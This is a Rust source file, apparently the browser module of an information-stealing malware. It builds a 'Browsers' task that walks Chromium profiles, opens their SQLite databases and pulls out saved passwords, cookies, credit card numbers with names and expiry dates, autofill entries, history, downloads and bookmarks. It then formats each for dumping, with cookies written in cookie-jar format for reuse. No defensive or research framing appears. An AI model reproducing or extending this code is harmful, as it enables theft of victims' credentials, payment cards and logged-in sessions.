#![feature(let_chains)]
#![no_std]

extern crate alloc;
use database::Database;
pub mod chromium;

use crate::alloc::borrow::ToOwned;
use crate::chromium::ChromiumTask;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec;
use alloc::vec::Vec;
use collector::Collector;
use core::fmt::{Display, Formatter};
use database::DatabaseExt;
use database::bindings::Sqlite3BindingsDatabase;
use filesystem::path::Path;
use filesystem::{FileSystem, WriteTo};
use tasks::Task;
use tasks::{CompositeTask, composite_task, impl_composite_task_runner};

pub(crate) type SqliteDatabase = Sqlite3BindingsDatabase;

pub struct BrowsersTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>,
}

impl<C: Collector + 'static, F: FileSystem + 'static> Default for BrowsersTask<C, F> {
    fn default() -> Self {
        Self {
            inner: composite_task!(ChromiumTask::new()),
        }
    }
}

impl_composite_task_runner!(BrowsersTask<C, F>, "Browsers");

pub(crate) fn collect_unique_from_profiles<F, T>(profiles: &[Path], f: F) -> Option<Vec<T>>
where
    F: Fn(&Path) -> Option<Vec<T>>,
    T: Ord,
{
    let mut data: Vec<T> = profiles
        .iter()
        .filter_map(f)
        .flat_map(|v| v.into_iter())
        .collect();

    if data.is_empty() {
        None
    } else {
        data.sort();
        data.dedup();

        Some(data)
    }
}

pub(crate) fn read_and_collect_unique_records<D, R, T>(
    profiles: &[Path],
    filesystem: &impl FileSystem,
    path: impl Fn(&Path) -> R,
    table: impl AsRef<str>,
    mapper: impl Fn(&D::Record) -> Option<T>,
) -> Option<Vec<T>>
where
    D: Database,
    R: AsRef<Path>,
    T: Ord,
{
    collect_unique_from_profiles(profiles, |profile| {
        let db_path = path(profile);

        if !filesystem.is_exists(db_path.as_ref()) {
            None
        } else {
            read_table_records_mapped::<D, _>(filesystem, db_path.as_ref(), table.as_ref(), &mapper)
        }
    })
}

pub(crate) fn read_table_records_mapped<D, T>(
    filesystem: &impl FileSystem,
    path: impl AsRef<Path>,
    table_name: &str,
    mapper: impl Fn(&D::Record) -> Option<T>,
) -> Option<Vec<T>>
where
    D: Database,
{
    let path = path.as_ref();

    let db: D = DatabaseExt::from_path(filesystem, path).ok()?;
    let table = db.read_table(table_name)?;

    let records = table.filter_map(|record| mapper(&record)).collect();

    Some(records)
}

pub(crate) fn to_string_and_write_all<F, T>(
    data: &[T],
    sep: &str,
    filesystem: &F,
    dst: &Path,
) -> Result<(), u32>
where
    T: Display,
    F: FileSystem,
{
    data.iter()
        .map(|it| it.to_string())
        .collect::<Vec<String>>()
        .join(sep)
        .write_to(filesystem, dst)
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Cookie {
    pub host_key: Arc<str>,
    pub name: Arc<str>,
    pub value: Arc<str>,
    pub path: Arc<str>,
    pub expires_utc: i64,
}

impl Display for Cookie {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "{}\tTRUE\t{}\tFALSE\t{}\t{}\t{}\r",
            self.host_key, self.path, self.expires_utc, self.name, self.value
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Bookmark {
    pub name: String,
    pub url: String,
}

impl Display for Bookmark {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Name: {}\n\
            Url: {}",
            self.name, self.url
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct AutoFill {
    pub name: Arc<str>,
    pub value: Arc<str>,
    pub last_used: i64,
}

impl Display for AutoFill {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Name: {}\n\
            Value: {}",
            self.name, self.value
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct CreditCard {
    pub name_on_card: Arc<str>,
    pub expiration_month: i64,
    pub expiration_year: i64,
    pub card_number: Arc<str>,
    pub use_count: i64,
}

impl Display for CreditCard {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Number: {}\n\
            Month/Year: {}/{}\n\
            Name: {}",
            self.card_number, self.expiration_month, self.expiration_year, self.name_on_card
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Download {
    pub saved_as: Arc<str>,
    pub url: Arc<str>,
}

impl Display for Download {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Url: {}\n\
            Saved: {}",
            self.url, self.saved_as
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct Password {
    pub origin: Option<Arc<str>>,
    pub username: Option<Arc<str>>,
    pub password: Option<Arc<str>>,
}

impl Display for Password {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Origin: {}\n\
            Username: {}\n\
            Password: {}",
            self.origin.as_deref().unwrap_or_default(),
            self.username.as_deref().unwrap_or_default(),
            self.password.as_deref().unwrap_or_default()
        )
    }
}

#[derive(PartialEq, Ord, Eq, PartialOrd)]
pub(crate) struct History {
    pub url: Arc<str>,
    pub title: Arc<str>,
    pub last_visit_time: i64,
}

impl Display for History {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            "Title: {}\n\
            Url: {}",
            self.title, self.url,
        )
    }
}
